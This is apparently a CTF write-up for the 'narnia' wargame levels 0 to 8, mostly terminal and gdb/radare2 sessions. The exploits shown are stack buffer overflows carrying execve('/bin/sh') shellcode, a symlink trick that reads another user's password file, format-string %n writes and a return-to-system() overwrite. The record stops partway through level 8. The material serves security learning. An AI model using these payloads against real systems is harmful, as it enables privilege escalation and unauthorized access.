@@ -1,0 +1,697 @@
+Passwords are found in /etc/narnia_pass/
+
+While the last level README asks not to post solutions or writeups, there are already a number of them out there so I don't feel like this is really going to spoil it any more that it already is.
+
+level0:
+
+narnia0@narnia:/narnia$ python -c "print 'A'*20 + '\xef\xbe\xad\xde'" | ./narnia0     
+Correct val's value from 0x41414141 -> 0xdeadbeef!                                    
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ                                       
+                                               val: 0xdeadbeef                        
+narnia0@narnia:/narnia$ 
+narnia0@narnia:/narnia$ (python -c "print 'A'*20 + '\xef\xbe\xad\xde'" && cat) | ./narnia0                                                                                   
+Correct val's value from 0x41414141 -> 0xdeadbeef!                                    
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ                                       
+                                               val: 0xdeadbeef                        
+whoami                                     
+narnia1                                    
+cat /etc/narnia_pass/narnia1               
+********** 
+
+
+narnia1:
+
+http://shell-storm.org/shellcode/files/shellcode-811.php
+
+narnia1@narnia:/narnia$ export EGG=$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'; ./narnia1
+Trying to execute EGG!
+$ whoami
+narnia2
+$ cat /etc/narnia_pass/narnia2
+**********
+$ 
+
+
+narnia2:
+python -c "print '\x90'*112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90\xd8\xff\xff'"
+python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+ 'A'*112 + '\x66\xd8\xff\xff'
+
+narnia2@narnia:/narnia$ ./narnia2 `python -c "print '\x90'*112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90\xd8\xff\xff'"
+> `
+$ whoami
+narnia3
+$ cat /etc/narnia_pass/narnia3
+**********
+
+narnia3:
+[0->31] + [0->16]
+0->16 needs to contain a file that we own so that the output gets piped to it
+0->31 needs to be the file that we dont own but needs to concatenate with the second array to make a full path that we own
+/etc/narnia_pass/narnia4 + /tmp/file
+symlink to the file we dont own so we can craft a directory/file structure to trick the open into opening the file we cant read and then overflowing the name just right into the output buffer so that it copies the password to a file we control
+
+ln -s /etc/narnia_pass/narnia4 /tmp/tmp/passfile
+/////////////////////////////tmp/tmp/passfile\0
+
+narnia3@narnia:/narnia$ mkdir /tmp/tmp
+narnia3@narnia:/narnia$ ln -s /etc/narnia_pass/narnia4 /tmp/tmp/passfile
+narnia3@narnia:/narnia$ touch /tmp/passfile
+narnia3@narnia:/narnia$ ./narnia3 `python -c "print '/////////////////////////////tmp/tmp/passfile\0'"`
+copied contents of /////////////////////////////tmp/tmp/passfile to a safer place... (/tmp/passfile)
+narnia3@narnia:/narnia$ cat /tmp/passfi
+cat: /tmp/passfi: No such file or directory
+narnia3@narnia:/narnia$ cat /tmp/passfile
+**********
+ÿîÖÿÿ4üâ÷ã_å÷}0,narnia3@narnia:/narnia$
+
+
+narnia4:
+ood `!python -c "print 'A'*272 + 'BCDE'"`
+
+run $(python -c "print '\x90'*244 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x40\xd8\xff\xff'")
+
+
+narnia4@narnia:/narnia$ ./narnia4 `python -c "print '\x90'*244 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x40\xd8\xff\xff'"`
+$ env
+PWD=/narnia
+$ USER=narnia5
+$ cat /etc/narnia_pass/narnia5
+**********
+
+narnia5:
+https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf
+format string
+%n writes to an address the number of bytes that have ben written
+so write to the i address
+8 byte formats * 4 + 3 periods + address == 39 bytes
+remove periods, change byte prints to equal 500 - address
+500 - 4 = 496/4 = 124
+
+narnia5@narnia:/narnia$ ./narnia5 `python -c "print '\x1c\xd7\xff\xff%08x.%08x.%08x.%08x%n'"`
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [×ÿÿf7eb8fe6.ffffffff.ffffd6fe.f7e2fc34] (39)
+i = 39 (0xffffd71c)
+narnia5@narnia:/narnia$ ./narnia5 `python -c "print '\x1c\xd7\xff\xff%08x.%08x.%08x.%16x%n'"`
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [×ÿÿf7eb8fe6.ffffffff.ffffd6fe.        f7e2fc34] (47)
+i = 47 (0xffffd71c)
+narnia5@narnia:/narnia$ ./narnia5 `python -c "print '\x1c\xd7\xff\xff%08x.%08x.%08x.%128x%n'"`
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [×ÿÿf7eb8fe6.ffffffff.ffffd6fe.                                ] (63)
+i = 159 (0xffffd71c)
+narnia5@narnia:/narnia$ ./narnia5 `python -c "print '\x1c\xd7\xff\xff%125x.%125x.%125x.%125x%n'"`
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [×ÿÿ                                                           ] (63)
+i = 507 (0xffffd71c)
+narnia5@narnia:/narnia$ ./narnia5 `python -c "print '\x1c\xd7\xff\xff%125x.%125x.%125x%125x%n'"`
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [×ÿÿ                                                           ] (63)
+i = 506 (0xffffd71c)
+narnia5@narnia:/narnia$ ./narnia5 `python -c "print '\x1c\xd7\xff\xff%125x%125x%125x%125x%n'"`
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [×ÿÿ                                                           ] (63)
+i = 504 (0xffffd71c)
+narnia5@narnia:/narnia$ ./narnia5 `python -c "print '\x1c\xd7\xff\xff%124x%124x%124x%124x%n'"`
+Change i's value from 1 -> 500. GOOD
+$ exit
+No way...let me give you a hint!
+buffer : [×ÿÿ                                                           ] (63)
+i = 500 (0xffffd71c)
+narnia5@narnia:/narnia$ ./narnia5 `python -c "print '\x1c\xd7\xff\xff%124x%124x%124x%124x%n'"`
+Change i's value from 1 -> 500. GOOD
+$ cat /etc/narnia_pass/narnia6
+**********
+$
+
+narnia6:
+cant put shellcode in an environment variable
+code checks to see if the address "ffffd6dc" starts with an ff which prevents pointing eip to shellcode in one of the arguments
+If we look at the stack in radare2, we can see that the way the local variables are allocated on the stack, it goes fp() -> b1 -> b2
+So we need to overwrite the fp() with a pointer that we dont provide it and that only takes a single argument that we can specify in the first argument
+system() with "/bin/sh" should suffice
+
+How to get the address of system?
+
+[0xf7fdbbe9]> dmm
+0x08048000 /narnia/narnia6
+0xf7e23000 /lib32/libc-2.19.so
+0xf7fdc000 /lib32/ld-2.19.so
+[0xf7fdbbe9]> dmi libc system
+vaddr=0xf7f3bc90 paddr=0x00118c90 ord=243 fwd=NONE sz=73 bind=GLOBAL type=FUNC name=svcerr_systemerr
+vaddr=0xf7e62e70 paddr=0x0003fe70 ord=620 fwd=NONE sz=56 bind=GLOBAL type=FUNC name=__libc_system
+vaddr=0xf7e62e70 paddr=0x0003fe70 ord=1443 fwd=NONE sz=56 bind=WEAK type=FUNC name=system
+
+ood `!python -c "print 'A'*8 + '\x70\x2e\xe6\xf7' + ' ' + 'B'*8 + '/bin/sh'"`
+So what we do is write arg1 to the stack, A*8 fills the b1 buffer and then the address overruns into the fp() so it now points to system() rather than puts()
+then arg2 is written to the stack. B*8 fills the b2 buffer and then "/bin/sh" overruns into the b1 buffer, providing the system() call with its parameter which it expects to be stored on the stack.
+
+
+narnia6@narnia:/narnia$ ./narnia6 `python -c "print 'A'*8 + '\x70\x2e\xe6\xf7' + ' ' + 'B'*8 + '/bin/sh'"`
+$ whoami
+narnia7
+$ cat /etc/narnia_pass/narnia7
+**********
+
+
+narnia7:
+python -c "print '\x6c\xd6\xff\xff' + '%x%x%x%x%134514410d%n'"
+
+(gdb) run A
+Starting program: /narnia/narnia7 A
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
+
+Breakpoint 4, 0x0804862c in vuln ()
+(gdb) c
+Continuing.
+before : ptrf() = 0x80486e0 (0xffffd67c)
+I guess you want to come to the hackedfunction...
+c
+
+Breakpoint 1, 0x0804867d in vuln ()
+(gdb) c
+Continuing.
+
+Breakpoint 3, 0x08048685 in vuln ()
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x0804868b in vuln ()
+(gdb) x/32x $esp-20
+0xffffd64c:	0xffffd66c	0xffffd680	0xf7ffd938	0xf7fcc000
+0xffffd65c:	0x08048685	0xffffd680	0x00000080	0xffffd8fe
+0xffffd66c:	0x08048238	0xffffd6d8	0xf7ffda94	0x00000000
+0xffffd67c:	0x080486e0	0x00000041	0x00000000	0x00000000
+0xffffd68c:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd69c:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd6ac:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd6bc:	0x00000000	0x00000000	0x00000000	0x00000000
+(gdb) x/32x $esp   
+0xffffd660:	0xffffd680	0x00000080	0xffffd8fe	0x08048238
+0xffffd670:	0xffffd6d8	0xf7ffda94	0x00000000	0x080486e0
+0xffffd680:	0x00000041	0x00000000	0x00000000	0x00000000
+0xffffd690:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd6a0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd6b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd6c0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd6d0:	0x00000000	0x00000000	0x00000000	0x00000000
+(gdb) 
+
+0x080486e0 is the address of the good function, it is stored at 0xffffd67c
+
+
+(gdb) run $(python -c "print '\x6c\xd6\xff\xff' + '%x%x%x%x%12345678d%n'")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia7 $(python -c "print '\x6c\xd6\xff\xff' + '%x%x%x%x%12345678d%n'")
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
+
+Breakpoint 4, 0x0804862c in vuln ()
+(gdb) c
+Continuing.
+before : ptrf() = 0x80486e0 (0xffffd66c)
+I guess you want to come to the hackedfunction...
+c
+Breakpoint 1, 0x0804867d in vuln ()
+(gdb) c
+Continuing.
+
+Breakpoint 3, 0x08048685 in vuln ()
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x0804868b in vuln ()
+(gdb) x/32x $esp
+0xffffd650:	0xffffd670	0x00000080	0xffffd8e7	0x08048238
+0xffffd660:	0xffffd6c8	0xf7ffda94	0x00000000	0x00bc616a
+0xffffd670:	0xffffd66c	0x38343038	0x66383332	0x64666666
+0xffffd680:	0x66386336	0x64666637	0x30343961	0x20202020
+0xffffd690:	0x20202020	0x20202020	0x20202020	0x20202020
+0xffffd6a0:	0x20202020	0x20202020	0x20202020	0x20202020
+0xffffd6b0:	0x20202020	0x20202020	0x20202020	0x20202020
+0xffffd6c0:	0x20202020	0x20202020	0x20202020	0x20202020
+
+however once we have a proper address set and some arbitrary address ready to write to it (12345678 decimal) the address is stored at 0xffffd66c
+hex 0x08048706 == 134514438  
+
+(gdb) run $(python -c "print '\x6c\xd6\xff\xff' + '%x%x%x%x%134514438d%n'")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia7 $(python -c "print '\x6c\xd6\xff\xff' + '%x%x%x%x%134514438d%n'")
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
+
+Breakpoint 4, 0x0804862c in vuln ()
+(gdb) c
+Continuing.
+before : ptrf() = 0x80486e0 (0xffffd66c)
+I guess you want to come to the hackedfunction...
+
+Breakpoint 1, 0x0804867d in vuln ()
+(gdb) c
+Continuing.
+
+Breakpoint 3, 0x08048685 in vuln ()
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x0804868b in vuln ()
+(gdb) x/32x $esp
+0xffffd650:	0xffffd670	0x00000080	0xffffd8e6	0x08048238
+0xffffd660:	0xffffd6c8	0xf7ffda94	0x00000000	0x08048722
+0xffffd670:	0xffffd66c	0x38343038	0x66383332	0x64666666
+0xffffd680:	0x66386336	0x64666637	0x30343961	0x20202020
+0xffffd690:	0x20202020	0x20202020	0x20202020	0x20202020
+0xffffd6a0:	0x20202020	0x20202020	0x20202020	0x20202020
+0xffffd6b0:	0x20202020	0x20202020	0x20202020	0x20202020
+0xffffd6c0:	0x20202020	0x20202020	0x20202020	0x20202020
+(gdb)
+
+there is an extra 0x1c (28) bytes of data being stored at the function pointer so subtract 28 from 134514438
+
+(gdb) run $(python -c "print '\x6c\xd6\xff\xff' + '%x%x%x%x%134514410d%n'")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia7 $(python -c "print '\x6c\xd6\xff\xff' + '%x%x%x%x%134514410d%n'")
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
+
+Breakpoint 4, 0x0804862c in vuln ()
+(gdb) c
+Continuing.
+before : ptrf() = 0x80486e0 (0xffffd66c)
+I guess you want to come to the hackedfunction...
+c
+Breakpoint 1, 0x0804867d in vuln ()
+(gdb) c
+Continuing.
+
+Breakpoint 3, 0x08048685 in vuln ()
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x0804868b in vuln ()
+(gdb) c
+Continuing.
+Way to go!!!!$ 
+$ 
+$ 
+$
+
+
+narnia7@narnia:/narnia$ ./narnia7 `python -c "print '\x6c\xd6\xff\xff' + '%x%x%x%x%134514410d%n'"`
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
+before : ptrf() = 0x80486e0 (0xffffd67c)
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+narnia7@narnia:/narnia$ ./narnia7 `python -c "print '\x7c\xd6\xff\xff' + '%x%x%x%x%134514410d%n'"`
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
+before : ptrf() = 0x80486e0 (0xffffd67c)
+I guess you want to come to the hackedfunction...
+Way to go!!!!$ 
+$ 
+$ whoami
+narnia8
+$ cat /etc/narnia_pass/narnia8
+**********
+$
+
+I got lucky and guessed the old address and it worked, but it is not always guaranteed to be a multiple of 16. The reason for this is that GDB adds a LINES and COLUMNS environment variables to excution. If we unset these at the start, all our debugging would have gotten us the correct address from the start
+
+
+(gdb) unset environment LINES
+(gdb) unset environment COLUMNS
+(gdb) run $(python -c "print '\x7c\xd6\xff\xff' + '%x%x%x%x%134514410d%n'")
+Starting program: /narnia/narnia7 $(python -c "print '\x7c\xd6\xff\xff' + '%x%x%x%x%134514410d%n'")
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
+before : ptrf() = 0x80486e0 (0xffffd67c)
+I guess you want to come to the hackedfunction...
+Way to go!!!!$ 
+$ 
+$
+
+
+narnia8:
+
+[0x0804849c]> x/1024x @ esp
+- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+0xffffd5a0  b8d5 ffff 0000 0000 1400 0000 e35f e5f7  ............._..
+0xffffd5b0  0000 0000 7d30 2c00 4141 4141 4141 4141  ....}0,.AAAAAAAA
+0xffffd5c0  4141 4141 4141 4141 4141 4141 f3d7 ffff  AAAAAAAAAAAA....
+
+So by default with 20 characters in the buffer the address 0xffffd7f3, pointing to the start of the argument passed
+
+
+[0xf7fdd0d0]> ood `!python -c "print 'A'*21"`
+Wait event received by different pid 1953
+Wait event received by different pid 1973
+Process with PID 1976 started...
+File dbg:///narnia/narnia8  AAAAAAAAAAAAAAAAAAAAA reopened in read-write mode
+= attach 1976 1976
+Assuming filepath /narnia/narnia8
+[0xf7fdd0d0]> dc
+Selecting and continuing: 1976
+hit breakpoint at: 804849c
+[0x0804849c]> x/1024x @ esp
+- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+0xffffd5a0  b8d5 ffff 0000 0000 1400 0000 e35f e5f7  ............._..
+0xffffd5b0  0000 0000 7d30 2c00 4141 4141 4141 4141  ....}0,.AAAAAAAA
+0xffffd5c0  4141 4141 4141 4141 4141 4141 41d7 ffff  AAAAAAAAAAAAA...
+0xffffd5d0  0200 0000 94d6 ffff f8d5 ffff cd84 0408  ................
+
+
+Notice that we can overwrite this address, interesting, but not unexpected cause it is a buffer overflow. Can we overflow over the address and into eip then?
+
+[0x0804849c]> ood `!python -c "print 'A'*200"`
+Wait event received by different pid 1973
+Wait event received by different pid 1976
+Process with PID 2009 started...
+File dbg:///narnia/narnia8  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA reopened in read-write mode
+= attach 2009 2009
+Assuming filepath /narnia/narnia8
+[0xf7fdd0d0]> dc
+Selecting and continuing: 2009
+hit breakpoint at: 804849c
+[0x0804849c]> x/1024x @ esp
+- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+0xffffd4e0  f8d4 ffff 0000 0000 1400 0000 e35f e5f7  ............._..
+0xffffd4f0  0000 0000 7d30 2c00 4141 4141 4141 4141  ....}0,.AAAAAAAA
+0xffffd500  4141 4141 4141 4141 4141 4141 4141 ffff  AAAAAAAAAAAAAA..
+0xffffd510  0200 0000 d4d5 ffff 38d5 ffff cd84 0408  ........8.......
+
+
+apparently not, we can only overwrite an extra 2 bytes before it stops overflowing.
+This pointer on the stack points to where the actual argument is stored, so maybe if we change the pointer to some place in the argument that contains for data, we can keep overflowing
+
+
+[0x0804849c]> ood `!python -c "print 'A'*20 + '\xf3\xd7\xff\xff'"`
+Wait event received by different pid 1976
+Wait event received by different pid 2009
+Process with PID 2087 started...
+File dbg:///narnia/narnia8  AAAAAAAAAAAAAAAAAAAAó×ÿÿ reopened in read-write mode
+= attach 2087 2087
+Assuming filepath /narnia/narnia8
+[0xf7fdd0d0]> dc
+Selecting and continuing: 2087
+hit breakpoint at: 804849c
+[0x0804849c]> x/1024x @ esp
+- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+0xffffd590  a8d5 ffff 0000 0000 1400 0000 e35f e5f7  ............._..
+0xffffd5a0  0000 0000 7d30 2c00 4141 4141 4141 4141  ....}0,.AAAAAAAA
+0xffffd5b0  4141 4141 4141 4141 4141 4141 f354 ffff  AAAAAAAAAAAA.T..
+0xffffd5c0  0200 0000 84d6 ffff e8d5 ffff cd84 0408  ................
+
+
+WTF, that isnt the address we wanted. If we look further down the stack, we see that adding the 4 byte address to the argument has actually made the address of the argument 4 bytes further down the stack, so lets do the math quickly.
+
+[0xf7fdd0d0]> ood `!python -c "print 'A'*20 + '\xef\xd7\xff\xff'"`
+Wait event received by different pid 2087
+Wait event received by different pid 2135
+Process with PID 2147 started...
+File dbg:///narnia/narnia8  AAAAAAAAAAAAAAAAAAAAï×ÿÿ reopened in read-write mode
+= attach 2147 2147
+Assuming filepath /narnia/narnia8
+[0xf7fdd0d0]> dc
+Selecting and continuing: 2147
+hit breakpoint at: 804849c
+[0x0804849c]> x/1024x @ esp
+- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+0xffffd590  a8d5 ffff 0000 0000 1400 0000 e35f e5f7  ............._..
+0xffffd5a0  0000 0000 7d30 2c00 4141 4141 4141 4141  ....}0,.AAAAAAAA
+0xffffd5b0  4141 4141 4141 4141 4141 4141 efd7 ffff  AAAAAAAAAAAA....
+0xffffd5c0  0200 0000 84d6 ffff e8d5 ffff cd84 0408  ................
+
+Okay so that worked much better, 0xf3-0x4 = 0xef. So lets try overwriting further down the stack by adding more bytes after the address, and subtracting that number of bytes from the address
+
+
+[0xf7fdbbe9]> ood `!python -c "print 'A'*20 + '\xe7\xd7\xff\xff' + 'B'*8"`
+Wait event received by different pid 2197
+Process with PID 2218 started...
+File dbg:///narnia/narnia8  AAAAAAAAAAAAAAAAAAAAç×ÿÿBBBBBBBB reopened in read-write mode
+= attach 2218 2218
+Assuming filepath /narnia/narnia8
+[0xf7fdd0d0]> dc
+Selecting and continuing: 2218
+hit breakpoint at: 804849c
+[0x0804849c]> x/1024x @ esp
+- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+0xffffd590  a8d5 ffff 0000 0000 1400 0000 e35f e5f7  ............._..
+0xffffd5a0  0000 0000 7d30 2c00 4141 4141 4141 4141  ....}0,.AAAAAAAA
+0xffffd5b0  4141 4141 4141 4141 4141 4141 e7d7 ffff  AAAAAAAAAAAA....
+0xffffd5c0  4242 4242 4242 4242 e8d5 ffff cd84 0408  BBBBBBBB........
+0xffffd5d0  e7d7 ffff 00d0 fff7 fb84 0408 00c0 fcf7  ................
+
+Great, now we know how to write through the stack, we just need to know how far to go to overwrite eip.
+func() is called at address 0x080484c8 in main(), so eip will be the next instruction after that, at 0x080484cd. So we know we have to write 12 bytes after the address before we get to eip, at which point we can point it to some shellcode at the end of our argument.
+
+
+[0xf7ad6cf9]> ood `!python -c "print 'A'*20 + '\xc6\xd7\xff\xff' + 'B'*12 + '\xb0\xd5\xff\xff' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"`
+Wait event received by different pid 2800
+Process with PID 2908 started...
+File dbg:///narnia/narnia8  AAAAAAAAAAAAAAAAAAAAÆ×ÿÿBBBBBBBBBBBB°Õÿÿ1ÀPh//shh/binãÁ°
+                                                                                    ̀1À reopened in read-write mode
+= attach 2908 2908
+Assuming filepath /narnia/narnia8
+[0xf7ad6cf9]> dc
+Selecting and continuing: 2908
+hit breakpoint at: 804849c
+[0x0804849c]> x/1024x @ esp
+- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+0xffffd570  88d5 ffff 0000 0000 1400 0000 e35f e5f7  ............._..
+0xffffd580  0000 0000 7d30 2c00 4141 4141 4141 4141  ....}0,.AAAAAAAA
+0xffffd590  4141 4141 4141 4141 4141 4141 c6d7 ffff  AAAAAAAAAAAA....
+0xffffd5a0  4242 4242 4242 4242 4242 4242 b0d5 ffff  BBBBBBBBBBBB....
+0xffffd5b0  31c0 5068 2f2f 7368 682f 6269 6e89 e389  1.Ph//shh/bin...
+0xffffd5c0  c189 c2b0 0bcd 8031 c000 0000 d3ca e3f7  .......1........
+0xffffd5d0  0200 0000 64d6 ffff 70d6 ffff caac fef7  ....d...p.......
+0xffffd5e0  0200 0000 64d6 ffff 04d6 ffff a497 0408  ....d...........
+0xffffd5f0  0c82 0408 00c0 fcf7 0000 0000 0000 0000  ................
+0xffffd600  0000 0000 306d 6d0c 20e9 5334 0000 0000  ....0mm. .S4....
+0xffffd610  0000 0000 0000 0000 0200 0000 3083 0408  ............0...
+0xffffd620  0000 0000 c004 fff7 e9c9 e3f7 00d0 fff7  ................
+0xffffd630  0200 0000 3083 0408 0000 0000 5183 0408  ....0.......Q...
+0xffffd640  ae84 0408 0200 0000 64d6 ffff f084 0408  ........d.......
+0xffffd650  6085 0408 60b1 fef7 5cd6 ffff 1c00 0000  `...`...\.......
+0xffffd660  0200 0000 b6d7 ffff c6d7 ffff 0000 0000  ................
+0xffffd670  08d8 ffff 1ad8 ffff 2ad8 ffff 49d8 ffff  ........*...I...
+0xffffd680  5cd8 ffff 65d8 ffff 72d8 ffff 93dd ffff  \...e...r.......
+0xffffd690  9edd ffff b5dd ffff 3cde ffff 48de ffff  ........<...H...
+0xffffd6a0  59de ffff 61de ffff 74de ffff 84de ffff  Y...a...t.......
+0xffffd6b0  b3de ffff d3de ffff f5de ffff 0adf ffff  ................
+0xffffd6c0  18df ffff 4fdf ffff 5adf ffff 68df ffff  ....O...Z...h...
+0xffffd6d0  7ddf ffff 93df ffff a4df ffff b1df ffff  }...............
+0xffffd6e0  bddf ffff c8df ffff d3df ffff dedf ffff  ................
+0xffffd6f0  0000 0000 2000 0000 e0bb fdf7 2100 0000  .... .......!...
+0xffffd700  00b0 fdf7 1000 0000 fffb 8b17 0600 0000  ................
+0xffffd710  0010 0000 1100 0000 6400 0000 0300 0000  ........d.......
+0xffffd720  3480 0408 0400 0000 2000 0000 0500 0000  4....... .......
+0xffffd730  0800 0000 0700 0000 00c0 fdf7 0800 0000  ................
+0xffffd740  0000 0000 0900 0000 3083 0408 0b00 0000  ........0.......
+0xffffd750  b836 0000 0c00 0000 b836 0000 0d00 0000  .6.......6......
+0xffffd760  b836 0000 0e00 0000 b836 0000 1700 0000  .6.......6......
+0xffffd770  0000 0000 1900 0000 9bd7 ffff 1f00 0000  ................
+0xffffd780  e8df ffff 0f00 0000 abd7 ffff 0000 0000  ................
+0xffffd790  0000 0000 0000 0000 0000 00ee 7f22 1666  .............".f
+0xffffd7a0  e3f9 6710 bc03 c8a3 d586 6f69 3638 3600  ..g.......oi686.
+0xffffd7b0  0000 0000 0000 2f6e 6172 6e69 612f 6e61  ....../narnia/na
+0xffffd7c0  726e 6961 3800 4141 4141 4141 4141 4141  rnia8.AAAAAAAAAA
+0xffffd7d0  4141 4141 4141 4141 4141 c6d7 ffff 4242  AAAAAAAAAA....BB
+0xffffd7e0  4242 4242 4242 4242 4242 b0d5 ffff 31c0  BBBBBBBBBB....1.
+0xffffd7f0  5068 2f2f 7368 682f 6269 6e89 e389 c189  Ph//shh/bin.....
+0xffffd800  c2b0 0bcd 8031 c000 5445 524d 3d72 7876  .....1..TERM=rxv
+0xffffd810  742d 756e 6963 6f64 6500 5348 454c 4c3d  t-unicode.SHELL=
+
+We see that the first address we need is 0xffffd7c6 and the address for eip can just be the address after where eip is stored on the stack, so 0xffffd5b0
+
+[0x0804849c]> dc
+Selecting and continuing: 2908
+AAAAAAAAAAAAAAAAAAAAÆ×ÿÿBBBBBBBBBBBB°Õÿÿ1ÀPh//shh/binãÁ°
+                                                        ̀1À
+[0xf7ddb2d0]> dc
+Selecting and continuing: 2908
+$ whoami
+narnia8
+child stopped with signal 17
+[+] SIGNAL 17 errno=0 addr=0x36b800000b81 code=1 ret=0
+got signal...
+[+] signal 17 aka SIGCHLD received 0
+
+[3]+  Stopped                 r2 -AAA -d ./narnia8
+
+It crashes in the radare2 environment but whatever, inconsequential.
+
+Launch narnia8 in gdb to get the real addresses (since I havent been able to figure out how to get radare2 to have the same stack/environment variable setup as gdb)
+
+
+(gdb) run $(python -c "print 'A'*20 + '\xbb\xd8\xff\xff' + 'B'*12 + '\xd0\xd6\xff\xff' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
+Starting program: /narnia/narnia8 $(python -c "print 'A'*20 + '\xbb\xd8\xff\xff' + 'B'*12 + '\xd0\xd6\xff\xff' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
+
+Breakpoint 1, 0x08048454 in func ()
+(gdb) x/64x $esp
+0xffffd6b0:	0xffffd6c8	0x00000000	0x00000014	0xf7e55fe3
+0xffffd6c0:	0x00000000	0x002c307d	0x00000000	0x00000000
+0xffffd6d0:	0x00000000	0x00000000	0x00000000	0xffffd8d0
+0xffffd6e0:	0x00000002	0xffffd7a4	0xffffd708	0x080484cd
+0xffffd6f0:	0xffffd8d0	0xf7ffd000	0x080484fb	0xf7fcc000
+0xffffd700:	0x080484f0	0x00000000	0x00000000	0xf7e3cad3
+0xffffd710:	0x00000002	0xffffd7a4	0xffffd7b0	0xf7feacca
+0xffffd720:	0x00000002	0xffffd7a4	0xffffd744	0x080497a4
+0xffffd730:	0x0804820c	0xf7fcc000	0x00000000	0x00000000
+0xffffd740:	0x00000000	0xb172d381	0x8949d791	0x00000000
+0xffffd750:	0x00000000	0x00000000	0x00000002	0x08048330
+0xffffd760:	0x00000000	0xf7ff04c0	0xf7e3c9e9	0xf7ffd000
+0xffffd770:	0x00000002	0x08048330	0x00000000	0x08048351
+0xffffd780:	0x080484ae	0x00000002	0xffffd7a4	0x080484f0
+0xffffd790:	0x08048560	0xf7feb160	0xffffd79c	0x0000001c
+0xffffd7a0:	0x00000002	0xffffd8c0	0xffffd8d0	0x00000000
+(gdb) run $(python -c "print 'A'*20 + '\xd0\xd8\xff\xff' + 'B'*12 + '\xf0\xd6\xff\xff' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
